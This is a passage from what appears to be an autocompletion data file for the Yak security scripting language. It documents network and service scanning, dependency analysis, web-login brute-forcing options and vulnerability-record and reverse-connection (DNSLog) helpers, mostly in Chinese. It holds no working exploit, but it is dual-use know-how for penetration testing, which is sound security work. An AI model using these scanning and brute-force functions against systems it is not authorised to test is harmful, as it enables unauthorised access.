            document: "",
            definitionStr: "active(raw bool) ConfigOption",
          },
          {
            functionName:
              "ScanOne(${1:target /*type: string*/}, ${2:port /*type: int*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'ScanOne(target string, port int, opts ...fp.ConfigOption) (*fp.MatchResult, error)  doc:ScanOne servicescan 单体扫描，同步扫描一个目标，主机+端口\n\n@param {string} target 目标地址\n\n@param {int} port 端口\n\n@param {ConfigOption} [opts] servicescan 扫描参数\n\n@return {MatchResult} 返回结果\n\nExample:\n```\nresult, err = servicescan.ScanOne("127.0.0.1", "22-80,443,3389")  // 开始扫描，函数会立即返回一个错误和结果\ndie(err) // 如果错误非空则报错\nif result.IsOpen() { // 获取到的结果是一个结构体，可以调用IsOpen方法判断该端口是否打开\n\n\t    println(result.String()) // 输出结果，调用String方法获取可读字符串\n\t    println(result.GetCPEs()) // 查看 CPE 结果\n\t}\n\n```\n',
          },
          {
            functionName: "ScanFromSynResult(${1:res}, ${2:opts...})",
            document: "",
            definitionStr:
              'ScanFromSynResult(res any, opts ...fp.ConfigOption) (chan *fp.MatchResult, error)  doc:ScanFromSynResult / ScanFromSpaceEngine 从 synscan.Scan 或者 spacengine.Query 的结果中进行指纹识别\n\n@param {interface{}} res synscan.Scan 或者 spacengine.Query 的结果\n\n@param {scanOpt} [opts] synscan 扫描参数\n\n@return {chan *MatchResult} 返回结果\n\nExample:\n```\nch, err = synscan.Scan("127.0.0.1", "22-80,443,3389")  // 开始扫描，函数会立即返回一个错误和结果管道\ndie(err) // 如果错误非空则报错\nfpResults, err := servicescan.ScanFromSynResult(ch) // 将synscan中拿到的结果传入servicescan中进行指纹扫描\ndie(err) // 如果错误非空则报错\nfor result := range fpResults { // 通过遍历管道的形式获取管道中的结果，一旦有结果返回就会执行循环体的代码\n\n\t   println(result.String()) // 输出结果，调用String方法获取可读字符串\n\t}\n\nres, err := spacengine.ShodanQuery(Apikey,query)\ndie(err) // 如果错误非空则报错\nfpResults, err := servicescan.ScanFromSpaceEngine(res) // 将spacengine中拿到的结果传入servicescan中进行指纹扫描\ndie(err) // 如果错误非空则报错\nfor result := range fpResults { // 通过遍历管道的形式获取管道中的结果，一旦有结果返回就会执行循环体的代码\n\n\t   println(result.String()) // 输出结果，调用String方法获取可读字符串\n\t}\n\n```\n',
          },
          {
            functionName: "ScanFromSpaceEngine(${1:res}, ${2:opts...})",
            document: "",
            definitionStr:
              'ScanFromSpaceEngine(res any, opts ...fp.ConfigOption) (chan *fp.MatchResult, error)  doc:ScanFromSynResult / ScanFromSpaceEngine 从 synscan.Scan 或者 spacengine.Query 的结果中进行指纹识别\n\n@param {interface{}} res synscan.Scan 或者 spacengine.Query 的结果\n\n@param {scanOpt} [opts] synscan 扫描参数\n\n@return {chan *MatchResult} 返回结果\n\nExample:\n```\nch, err = synscan.Scan("127.0.0.1", "22-80,443,3389")  // 开始扫描，函数会立即返回一个错误和结果管道\ndie(err) // 如果错误非空则报错\nfpResults, err := servicescan.ScanFromSynResult(ch) // 将synscan中拿到的结果传入servicescan中进行指纹扫描\ndie(err) // 如果错误非空则报错\nfor result := range fpResults { // 通过遍历管道的形式获取管道中的结果，一旦有结果返回就会执行循环体的代码\n\n\t   println(result.String()) // 输出结果，调用String方法获取可读字符串\n\t}\n\nres, err := spacengine.ShodanQuery(Apikey,query)\ndie(err) // 如果错误非空则报错\nfpResults, err := servicescan.ScanFromSpaceEngine(res) // 将spacengine中拿到的结果传入servicescan中进行指纹扫描\ndie(err) // 如果错误非空则报错\nfor result := range fpResults { // 通过遍历管道的形式获取管道中的结果，一旦有结果返回就会执行循环体的代码\n\n\t   println(result.String()) // 输出结果，调用String方法获取可读字符串\n\t}\n\n```\n',
          },
          {
            functionName:
              "ScanFromPing(${1:res /*type: chan *pingutil.PingResult*/}, ${2:ports /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'ScanFromPing(res chan *pingutil.PingResult, ports string, opts ...fp.ConfigOption) (chan *fp.MatchResult, error)  doc:ScanFromPing 从 ping.Scan 的结果中进行指纹识别\n\n@param {chan *pingutil.PingResult} res ping.Scan 的结果\n\n@param {string} ports 端口，支持 1-65535、1,2,3、1-100,200-300 格式\n\n@param {ConfigOption} [opts] synscan 扫描参数\n\n@return {chan *MatchResult} 返回结果\n\nExample:\n```\npingResult, err = ping.Scan("192.168.1.1/24") // 先进行存活探测\ndie(err)\nfpResults, err := servicescan.ScanFromPing(pingResult, "22-80,443,3389") // 将ping中拿到的结果传入servicescan中进行指纹扫描\ndie(err) // 如果错误非空则报错\nfor result := range fpResults { // 通过遍历管道的形式获取管道中的结果，一旦有结果返回就会执行循环体的代码\n\n\t   println(result.String()) // 输出结果，调用String方法获取可读字符串\n\t}\n\n```\n',
          },
          {
            functionName:
              "Scan(${1:target /*type: string*/}, ${2:port /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              'Scan(target string, port string, opts ...fp.ConfigOption) (chan *fp.MatchResult, error)  doc:Scan servicescan 库使用的端口扫描类型的方式为全连接扫描，用于对连接目标进行精准的扫描，相比 synscan 库的单纯扫描，servicescan 库会尝试获取精确指纹信息以及 CPE 信息\n\n@param {string} target 目标地址，支持 CIDR 格式，支持 192.168.1.1-100 格式\n\n@param {string} port 端口，支持 1-65535、1,2,3、1-100,200-300 格式\n\n@param {ConfigOption} [opts] servicescan 扫描参数\n\n@return {chan *MatchResult} 返回结果\n\nExample:\n```\nch, err = servicescan.Scan("127.0.0.1", "22-80,443,3389")  // 开始扫描，函数会立即返回一个错误和结果管道\ndie(err) // 如果错误非空则报错\nfor result := range ch { // 通过遍历管道的形式获取管道中的结果\n\n\t   if result.IsOpen() { // 获取到的结果是一个结构体，可以调用IsOpen方法判断该端口是否打开\n\t       println(result.String()) // 输出结果，调用String方法获取可读字符串\n\t       println(result.GetCPEs()) // 查看 CPE 结果\n\t   }\n\t}\n\n```\n',
          },
        ],
      },
      {
        libName: "sca",
        prefix: "sca.",
        functions: [
          {
            functionName: "scanMode(${1:mode /*type: analyzer.ScanMode*/})",
            document: "",
            definitionStr: "scanMode(mode analyzer.ScanMode) ScanOption",
          },
          {
            functionName: "endpoint(${1:endpoint /*type: string*/})",
            document: "",
            definitionStr: "endpoint(endpoint string) ScanOption",
          },
          {
            functionName:
              "customAnalyzer(${1:matchFunc /*type: func(info analyzer.MatchInfo) int*/}, ${2:analyzeFunc /*type: func(fi *analyzer.FileInfo, otherFi map[string]*analyzer.FileInfo) []*analyzer.CustomPackage*/})",
            document: "",
            definitionStr:
              "customAnalyzer(matchFunc func(info analyzer.MatchInfo) int, analyzeFunc func(fi *analyzer.FileInfo, otherFi map[string]*analyzer.FileInfo) []*analyzer.CustomPackage) ScanOption",
          },
          {
            functionName: "concurrent(${1:n /*type: int*/})",
            document: "",
            definitionStr: "concurrent(n int) ScanOption",
          },
          {
            functionName: "analyzers(${1:a...})",
            document: "",
            definitionStr: "analyzers(a ...analyzer.TypAnalyzer) ScanOption",
          },
          {
            functionName:
              "ScanLocalFilesystem(${1:p /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "ScanLocalFilesystem(p string, opts ...ScanOption) ([]*dxtypes.Package, error)",
          },
          {
            functionName:
              "ScanImageFromFile(${1:path /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "ScanImageFromFile(path string, opts ...ScanOption) ([]*dxtypes.Package, error)",
          },
          {
            functionName:
              "ScanImageFromContext(${1:imageID /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "ScanImageFromContext(imageID string, opts ...ScanOption) ([]*dxtypes.Package, error)",
          },
          {
            functionName:
              "ScanGitRepo(${1:repoDir /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "ScanGitRepo(repoDir string, opts ...ScanOption) ([]*dxtypes.Package, error)",
          },
          {
            functionName:
              "ScanFilesystem(${1:p /*type: fi.FileSystem*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "ScanFilesystem(p fi.FileSystem, opts ...ScanOption) ([]*dxtypes.Package, error)",
          },
          {
            functionName:
              "ScanContainerFromContext(${1:containerID /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "ScanContainerFromContext(containerID string, opts ...ScanOption) (pkgs []*dxtypes.Package, err error)",
          },
          {
            functionName:
              "NewAnalyzerResult(${1:name /*type: string*/}, ${2:version /*type: string*/})",
            document: "",
            definitionStr:
              "NewAnalyzerResult(name string, version string) *CustomPackage",
          },
          {
            functionName: "MODE_PKG",
            document: "sca.MODE_PKG: int = 0x2",
            definitionStr: "sca.MODE_PKG: int = 0x2",
          },
          {
            functionName: "MODE_LANGUAGE",
            document: "sca.MODE_LANGUAGE: int = 0x4",
            definitionStr: "sca.MODE_LANGUAGE: int = 0x4",
          },
          {
            functionName: "MODE_ALL",
            document: "sca.MODE_ALL: analyzer.ScanMode",
            definitionStr: "sca.MODE_ALL: analyzer.ScanMode",
          },
          {
            functionName: "ANALYZER_TYPE_RUST_CARGO",
            document: "sca.ANALYZER_TYPE_RUST_CARGO: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_RUST_CARGO: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_RUBY_GEMSPEC",
            document: "sca.ANALYZER_TYPE_RUBY_GEMSPEC: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_RUBY_GEMSPEC: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_RUBY_BUNDLER",
            document: "sca.ANALYZER_TYPE_RUBY_BUNDLER: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_RUBY_BUNDLER: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_RPM",
            document: "sca.ANALYZER_TYPE_RPM: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_RPM: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_PYTHON_POETRY",
            document: "sca.ANALYZER_TYPE_PYTHON_POETRY: analyzer.TypAnalyzer",
            definitionStr:
              "sca.ANALYZER_TYPE_PYTHON_POETRY: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_PYTHON_PIPENV",
            document: "sca.ANALYZER_TYPE_PYTHON_PIPENV: analyzer.TypAnalyzer",
            definitionStr:
              "sca.ANALYZER_TYPE_PYTHON_PIPENV: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_PYTHON_PIP",
            document: "sca.ANALYZER_TYPE_PYTHON_PIP: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_PYTHON_PIP: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_PYTHON_PACKAGING",
            document: "sca.ANALYZER_TYPE_PYTHON_PACKAGING: analyzer.TypAnalyzer",
            definitionStr:
              "sca.ANALYZER_TYPE_PYTHON_PACKAGING: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_PHP_COMPOSER",
            document: "sca.ANALYZER_TYPE_PHP_COMPOSER: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_PHP_COMPOSER: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_NODE_YARN",
            document: "sca.ANALYZER_TYPE_NODE_YARN: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_NODE_YARN: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_NODE_PNPM",
            document: "sca.ANALYZER_TYPE_NODE_PNPM: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_NODE_PNPM: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_NODE_NPM",
            document: "sca.ANALYZER_TYPE_NODE_NPM: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_NODE_NPM: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_JAVA_POM",
            document: "sca.ANALYZER_TYPE_JAVA_POM: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_JAVA_POM: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_JAVA_JAR",
            document: "sca.ANALYZER_TYPE_JAVA_JAR: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_JAVA_JAR: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_JAVA_GRADLE",
            document: "sca.ANALYZER_TYPE_JAVA_GRADLE: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_JAVA_GRADLE: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_GO_MOD",
            document: "sca.ANALYZER_TYPE_GO_MOD: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_GO_MOD: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_GO_BINARY",
            document: "sca.ANALYZER_TYPE_GO_BINARY: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_GO_BINARY: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_DPKG",
            document: "sca.ANALYZER_TYPE_DPKG: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_DPKG: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_CLANG_CONAN",
            document: "sca.ANALYZER_TYPE_CLANG_CONAN: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_CLANG_CONAN: analyzer.TypAnalyzer",
          },
          {
            functionName: "ANALYZER_TYPE_APK",
            document: "sca.ANALYZER_TYPE_APK: analyzer.TypAnalyzer",
            definitionStr: "sca.ANALYZER_TYPE_APK: analyzer.TypAnalyzer",
          },
        ],
      },
      {
        libName: "sandbox",
        prefix: "sandbox.",
        functions: [
          {
            functionName: "library(${1:lib /*type: map[string]any*/})",
            document: "",
            definitionStr: "library(lib map[string]any) SandboxOption",
          },
          {
            functionName: "Create(${1:opts...})",
            document: "",
            definitionStr: "Create(opts ...SandboxOption) *Sandbox",
          },
        ],
      },
      {
        libName: "rpa",
        prefix: "rpa.",
        functions: [
          {
            functionName: "whiteDomain(${1:matchStr /*type: string*/})",
            document: "",
            definitionStr: "whiteDomain(matchStr string) ConfigOpt",
          },
          {
            functionName: "timeout(${1:timeout /*type: int*/})",
            document: "",
            definitionStr: "timeout(timeout int) ConfigOpt",
          },
          {
            functionName: "strictUrl(${1:status /*type: bool*/})",
            document: "",
            definitionStr: "strictUrl(status bool) ConfigOpt",
          },
          {
            functionName:
              "select(${1:selector /*type: string*/}, ${2:item /*type: string*/})",
            document: "",
            definitionStr: "select(selector string, item string) ConfigOpt",
          },
          {
            functionName: "proxy(${1:url /*type: string*/}, ${2:userinfo...})",
            document: "",
            definitionStr: "proxy(url string, userinfo ...string) ConfigOpt",
          },
          {
            functionName: "maxUrl(${1:count /*type: int*/})",
            document: "",
            definitionStr: "maxUrl(count int) ConfigOpt",
          },
          {
            functionName:
              "input(${1:selector /*type: string*/}, ${2:inputStr /*type: string*/})",
            document: "",
            definitionStr: "input(selector string, inputStr string) ConfigOpt",
          },
          {
            functionName: "headers(${1:s /*type: string*/})",
            document: "",
            definitionStr: "headers(s string) ConfigOpt",
          },
          {
            functionName: "depth(${1:depth /*type: int*/})",
            document: "",
            definitionStr: "depth(depth int) ConfigOpt",
          },
          {
            functionName: "click(${1:selector /*type: string*/})",
            document: "",
            definitionStr: "click(selector string) ConfigOpt",
          },
          {
            functionName: "bruteUsername(${1:username...})",
            document: "",
            definitionStr: "bruteUsername(username ...string) ConfigOpt",
          },
          {
            functionName: "bruteUserPassPath(${1:filepath...})",
            document: "",
            definitionStr: "bruteUserPassPath(filepath ...string) ConfigOpt",
          },
          {
            functionName: "bruteUserElement(${1:element /*type: string*/})",
            document: "",
            definitionStr: "bruteUserElement(element string) ConfigOpt",
          },
          {
            functionName: "brutePassword(${1:password...})",
            document: "",
            definitionStr: "brutePassword(password ...string) ConfigOpt",
          },
          {
            functionName: "brutePassElement(${1:element /*type: string*/})",
            document: "",
            definitionStr: "brutePassElement(element string) ConfigOpt",
          },
          {
            functionName:
              "bruteCaptchaElement(${1:element /*type: string*/}, ${2:pic /*type: string*/})",
            document: "",
            definitionStr:
              "bruteCaptchaElement(element string, pic string) ConfigOpt",
          },
          {
            functionName: "bruteButtonElement(${1:element /*type: string*/})",
            document: "",
            definitionStr: "bruteButtonElement(element string) ConfigOpt",
          },
          {
            functionName: "blackDomain(${1:matchStr /*type: string*/})",
            document: "",
            definitionStr: "blackDomain(matchStr string) ConfigOpt",
          },
          {
            functionName: "Start(${1:url /*type: string*/}, ${2:opt...})",
            document: "",
            definitionStr:
              "Start(url string, opt ...core.ConfigOpt) (chan core.RequestIf, error)",
          },
          {
            functionName: "Bruteforce(${1:url /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              "Bruteforce(url string, opts ...ConfigOpt) (string, string)",
          },
        ],
      },
      {
        libName: "risk",
        prefix: "risk.",
        functions: [
          {
            functionName: "typeVerbose(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'typeVerbose(i string) RiskParamsOpt  doc:typeVerbose 是一个选项参数，用于指定风险类型的详细描述\n\nExample:\n```\nrisk.NewRisk(target, risk.typeVerbose("SQL注入漏洞"))\n```\n',
          },
          {
            functionName: "type(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'type(i string) RiskParamsOpt  doc:type 是一个选项参数，用于指定风险类型，可用的风险类型:\n\nSQL 注入: sqli​,sqlinj​,sql-inj,sqlinjection​,sql-injection​\n\n跨站脚本:xss​\n\n远程执行: rce​,rce-command,rce-code​\n\n文件操作: lfi​,file-read​,file-download​,rfi​,file-write​,file-upload​\n\n其他注入类型: xxe​,ssti​\n\n序列化问题: unserialize​,deserialization​\n\n访问控制: unauth-access​\n\n未授权访问​: auth-bypass​,authentication-bypass​,privilege-escalation​\n\n信息泄露: path-traversal​,info-exposure​,information-exposure​\n\n配置与凭证问题: insecure-default​,weak-pass​,weak-password​,weak-credential​\n\n逻辑漏洞: logic​\n\n安全测试: compliance-test​,cve-baseline​\n\n服务端请求伪造: ssrf​\n\n跨站请求伪造 : csrf​\n\n反连检测: random-port-trigger[tcp]​,random-port-trigger[udp]​,reverse​,reverse-​,reverse-tcp​,reverse-tls​,reverse-rmi​,reverse-rmi-handshake​,reverse-http​,reverse-https​,reverse-dns​,reverse-ldap\n\nExample:\n```\nrisk.NewRisk(\naddr,\nrisk.title("CVE-2021-22145"),\nrisk.severity("low"),\nrisk.titleVerbose("CVE-2021-22145 Elasticsearch 敏感信息泄漏漏洞"),\nrisk.type("info-exposure"),\nrisk.cve("CVE-2021-22145"),\n)\n```\n',
          },
          {
            functionName: "token(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'token(i string) RiskParamsOpt  doc:token 是一个选项参数，用于指定风险记录的反连 token\n\nExample:\n```\nrisk.NewRisk(target, risk.token("token"))\n```\n',
          },
          {
            functionName: "titleVerbose(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              "titleVerbose(i string) RiskParamsOpt  doc:titleVerbose 是一个选项参数，用于指定漏洞记录的详细标题\n\nExample:\n```\nrisk.NewRisk(target, risk.titleVerbose(verbose_title))\n```\n",
          },
          {
            functionName: "title(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              "title(i string) RiskParamsOpt  doc:title 是一个选项参数，用于指定漏洞记录的标题\n\nExample:\n```\nrisk.NewRisk(target, risk.title(title))\n```\n",
          },
          {
            functionName: "solution(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              "solution(i string) RiskParamsOpt  doc:solution 是一个选项参数，用于指定漏洞记录的解决方案\n\nExample:\n```\nrisk.NewRisk(target, risk.description(description), risk.solution(solution))\n```\n",
          },
          {
            functionName: "severity(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'severity(i string) RiskParamsOpt  doc:severity 是一个选项参数，用于指定风险记录的严重程度\n\n可用的严重程度有: critical, high, warning, info, low\n\nExample:\n```\nrisk.NewRisk(target, risk.severity("high"))\n```\n',
          },
          {
            functionName: "runtimeId(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              "runtimeId(i string) RiskParamsOpt  doc:runtimeId 是一个选项参数，用于指定风险记录的运行时 ID\n\nExample:\n```\nrisk.NewRisk(target, risk.runtimeId(runtime_id))\n```\n",
          },
          {
            functionName: "response(${1:i})",
            document: "",
            definitionStr:
              "response(i any) RiskParamsOpt  doc:response 是一个选项参数，用于指定风险记录的原始响应报文\n\nExample:\n```\nrisk.NewRisk(target, risk.response(resp))\n```\n",
          },
          {
            functionName: "request(${1:i})",
            document: "",
            definitionStr:
              "request(i any) RiskParamsOpt  doc:request 是一个选项参数，用于指定风险记录的原始请求报文\n\nExample:\n```\nrisk.NewRisk(target, risk.request(req))\n```\n",
          },
          {
            functionName: "potential(${1:i /*type: bool*/})",
            document: "",
            definitionStr: "potential(i bool) RiskParamsOpt",
          },
          {
            functionName: "payload(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'payload(i string) RiskParamsOpt  doc:payload 是一个选项参数，用于指定漏洞记录的载荷(payload)\n\nExample:\n```\nrisk.NewRisk(target, risk.payload("payload"))\n```\n',
          },
          {
            functionName: "parameter(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'parameter(i string) RiskParamsOpt  doc:parameter 是一个选项参数，用于指定风险记录的参数\n\nExample:\n```\nrisk.NewRisk(target, risk.parameter("param"))\n```\n',
          },
          {
            functionName: "level(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'level(i string) RiskParamsOpt  doc:severity 是一个选项参数，用于指定风险记录的严重程度\n\n可用的严重程度有: critical, high, warning, info, low\n\nExample:\n```\nrisk.NewRisk(target, risk.severity("high"))\n```\n',
          },
          {
            functionName: "ignore(${1:r /*type: *schema.Risk*/})",
            document: "",
            definitionStr: "ignore(r *schema.Risk) any",
          },
          {
            functionName: "fromYakScript(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              'fromYakScript(i string) RiskParamsOpt  doc:fromScript 是一个选项参数，用于指定风险记录的来源插件名\n\nExample:\n```\nrisk.NewRisk(target, risk.fromScript("plugin_name"))\n```\n',
          },
          {
            functionName: "details(${1:i})",
            document: "",
            definitionStr:
              'details(i any) RiskParamsOpt  doc:details 是一个选项参数，用于指定风险记录的详细信息\n\nExample:\n```\nrisk.NewRisk(target, risk.details({"message": message, "ohter_message": message}))\n```\n',
          },
          {
            functionName: "description(${1:i /*type: string*/})",
            document: "",
            definitionStr:
              "description(i string) RiskParamsOpt  doc:description 是一个选项参数，用于指定漏洞记录的描述\n\nExample:\n```\nrisk.NewRisk(target, risk.description(description))\n```\n",
          },
          {
            functionName: "cve(${1:s /*type: string*/})",
            document: "",
            definitionStr:
              'cve(s string) RiskParamsOpt  doc:cve 是一个选项参数，用于指定风险记录的 CVE 编号\n\nExample:\n```\nrisk.NewRisk(target, risk.cve("CVE-2021-22145"))\n```\n',
          },
          {
            functionName: "YieldRiskByTarget(${1:target /*type: string*/})",
            document: "",
            definitionStr:
              'YieldRiskByTarget(target string) chan *schema.Risk  doc:YieldRiskByTarget 根据目标(ip或ip:port)获取风险记录，返回风险记录的管道\n\nExample:\n```\nfor risk := range YieldRiskByTarget("example.com") {\nprintln(risk)\n}\n```\n',
          },
          {
            functionName:
              "YieldRiskByScriptName(${1:scriptName /*type: string*/})",
            document: "",
            definitionStr:
              'YieldRiskByScriptName(scriptName string) chan *schema.Risk  doc:YieldRiskByScriptName 根据插件名戳获取风险记录，返回风险记录的管道\n\nExample:\n```\nfor risk := range YieldRiskByScriptName("基础 XSS 检测") {\nprintln(risk)\n}\n```\n',
          },
          {
            functionName: "YieldRiskByRuntimeId(${1:runtimeId /*type: string*/})",
            document: "",
            definitionStr:
              'YieldRiskByRuntimeId(runtimeId string) chan *schema.Risk  doc:YieldRiskByRuntimeId 根据 RuntimeID 获取风险记录，返回风险记录的管道\n\nExample:\n```\nfor risk := range YieldRiskByRuntimeId("161c5372-3e75-46f6-a6bf-1a3182da625e") {\nprintln(risk)\n}\n```\n',
          },
          {
            functionName: "YieldRiskByCreateAt(${1:timestamp /*type: int64*/})",
            document: "",
            definitionStr:
              'YieldRiskByCreateAt(timestamp int64) chan *schema.Risk  doc:YieldRiskByCreateAt 根据创建时间戳获取风险记录，返回风险记录的管道\n\nExample:\n```\nts = time.Parse("2006-01-02 15:04:05", "2020-01-01 00:00:00")~.Unix()\nfor risk := range YieldRiskByCreateAt(ts) {\nprintln(risk)\n}\n```\n',
          },
          {
            functionName: "Save(${1:r /*type: *schema.Risk*/})",
            document: "",
            definitionStr:
              'Save(r *schema.Risk) error  doc:Save 将漏洞记录结构体保存到数据库中其通常与 CreateRisk 一起使用\n\nExample:\n```\nr = risk.CreateRisk("http://example.com", risk.title("SQL注入漏洞"), risk.type("sqli"), risk.severity("high"))\nrisk.Save(r)\n```\n',
          },
          {
            functionName:
              "RegisterBeforeRiskSave(${1:f /*type: func(*schema.Risk)*/})",
            document: "",
            definitionStr: "RegisterBeforeRiskSave(f func(*schema.Risk))",
          },
          {
            functionName:
              "NewUnverifiedRisk(${1:u /*type: string*/}, ${2:token /*type: string*/}, ${3:opts...})",
            document: "",
            definitionStr:
              "NewUnverifiedRisk(u string, token string, opts ...RiskParamsOpt) (*schema.Risk, error)",
          },
          {
            functionName: "NewRisk(${1:target /*type: string*/}, ${2:opts...})",
            document: "",
            definitionStr:
              'NewRisk(target string, opts ...yakit.RiskParamsOpt) any  doc:NewRisk 创建一条漏洞记录结构体并保存到数据库中，第一个参数是目标URL，后面可以传入零个或多个选项参数，用于指定 risk 的结构\n\nExample:\n```\nrisk.NewRisk("http://example.com", risk.title("SQL注入漏洞"), risk.type("sqli"), risk.severity("high"), risk.description(""), risk.solution(""))\n```\n',
          },
          {
            functionName: "NewRandomPortTrigger(${1:opt...})",
            document: "",
            definitionStr:
              "NewRandomPortTrigger(opt ...RiskParamsOpt) (token string, addr string, _ error)  doc:NewRandomPortTrigger 返回一个公网 Bridge 的随机端口反连检测地址，返回的第一个值是 token，第二个值是检测地址，第三个值是错误\n\nExample:\n```\ntoken, addr = risk.NewRandomPortTrigger()~\n```\n",
          },
          {
            functionName: "NewPublicReverseRMIUrl()",
            document: "",
            definitionStr:
              "NewPublicReverseRMIUrl() string  doc:NewPublicReverseRMIUrl 返回一个公网 Bridge 的反向 RMI URL\n\nExample:\n```\nurl := NewPublicReverseRMIUrl()\n```\n",
          },
          {
            functionName: "NewPublicReverseHTTPUrl()",
            document: "",
            definitionStr:
              "NewPublicReverseHTTPUrl() string  doc:NewPublicReverseHTTPUrl 返回一个公网 Bridge 的反向 HTTP URL\n\nExample:\n```\nurl := NewPublicReverseHTTPUrl()\n```\n",
          },
          {
            functionName: "NewPublicReverseHTTPSUrl()",
            document: "",
            definitionStr:
              "NewPublicReverseHTTPSUrl() string  doc:NewPublicReverseHTTPSUrl 返回一个公网 Bridge 的反向 HTTPS URL\n\nExample:\n```\nurl := NewPublicReverseHTTPSUrl()\n```\n",
          },
          {
            functionName: "NewLocalReverseRMIUrl()",
            document: "",
            definitionStr:
              "NewLocalReverseRMIUrl() string  doc:NewLocalReverseRMIUrl 返回一个本地 Bridge 的反向 RMI URL\n\nExample:\n```\nurl := NewLocalReverseRMIUrl()\n```\n",
          },
          {
            functionName: "NewLocalReverseHTTPUrl()",
            document: "",
            definitionStr:
              "NewLocalReverseHTTPUrl() string  doc:NewLocalReverseHTTPUrl 返回一个本地 Bridge 的反向 HTTP URL\n\nExample:\n```\nurl := NewLocalReverseHTTPUrl()\n```\n",
          },
          {
            functionName: "NewLocalReverseHTTPSUrl()",
            document: "",
            definitionStr:
              "NewLocalReverseHTTPSUrl() string  doc:NewLocalReverseHTTPSUrl 返回一个本地 Bridge 的反向 HTTPS URL\n\nExample:\n```\nurl := NewLocalReverseHTTPSUrl()\n```\n",
          },
          {
            functionName: "NewHTTPLog(${1:i...})",
            document: "",
            definitionStr:
              "NewHTTPLog(i ...any) (domain string, token string, _ error)  doc:NewHTTPLog 返回一个公网 Bridge 的 HTTPLog 域名，返回的第一个值是域名，第二个值是 token，第三个值是错误\n\nExample:\n```\ndomain, token = risk.NewHTTPLog()~\n```\n",
          },
          {
            functionName: "NewDNSLogDomain()",
            document: "",
            definitionStr:
              "NewDNSLogDomain() (domain string, token string, _ error)  doc:NewDNSLogDomain 返回一个公网 Bridge 的 DNSLog 域名，返回的第一个值是域名，第二个值是 token，第三个值是错误\n\nExample:\n```\ndomain, token = risk.NewDNSLogDomain()~\n```\n",
          },
          {
            functionName: "HaveReverseRisk(${1:token /*type: string*/})",
            document: "",
            definitionStr:
              'HaveReverseRisk(token string) bool  doc:HaveReverseRisk 通过轮询检查是否存在对应token的反连记录，重试最多5次，每次等待1秒， 如果存在返回true，否则返回false\n\nExample:\n```\nif risk.HaveReverseRisk("token") { // 轮询检查是否存在反连风险，会阻塞\nprintln("have reverse risk")\n}\n```\n',
          },
          {
            functionName: "ExtractTokenFromUrl(${1:tokenUrl /*type: string*/})",
            document: "",
            definitionStr: "ExtractTokenFromUrl(tokenUrl string) string",
          },
          {
            functionName: "DeleteRiskByTarget(${1:addr /*type: string*/})",
            document: "",
            definitionStr:
              'DeleteRiskByTarget(addr string) error  doc:DeleteRiskByTarget 根据目标(ip或ip:port)删除风险记录\n\nExample:\n```\nDeleteRiskByTarget("example.com")\n```\n',
          },
          {
            functionName: "DeleteRiskByID(${1:id /*type: int64*/})",
            document: "",
            definitionStr:
